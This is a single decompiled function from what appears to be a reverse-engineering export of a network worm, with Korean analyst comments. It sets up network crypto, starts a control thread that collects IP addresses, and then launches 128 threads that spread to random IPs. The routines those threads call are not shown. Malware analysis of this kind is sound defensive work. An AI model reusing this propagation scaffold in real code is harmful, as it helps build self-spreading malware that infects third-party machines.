// --- Metadata ---
// Function Name: initialize_multithreaded_spread_407BD0
// Address: 0x407BD0
// Exported At: 20250527_191039
// Signature: unknown_signature
// ---------------
int initialize_multithreaded_spread_407BD0()
{
  int result; // eax
  void *controlThreadHandle; // eax 컨트롤 쓰레드 한 개 
  int threadIndex; // esi
  void *workerThreadHandle; // eax

  result = setupNetworkCrypto_407B90();
  if ( result )
  {
    controlThreadHandle = beginthreadex(0, 0, collectIP_spreadWormManager_407720, 0, 0, 0);
    if ( controlThreadHandle )
      CloseHandle(controlThreadHandle);
    for ( threadIndex = 0; threadIndex < 128; ++threadIndex )// 작업 쓰레드 128개 
    {
      workerThreadHandle = beginthreadex(0, 0, netSpreadRandomIP_407840, threadIndex, 0, 0);
      if ( workerThreadHandle )
        CloseHandle(workerThreadHandle);
      Sleep(0x7D0u);
    }
    result = 0;
  }
  return result;
}
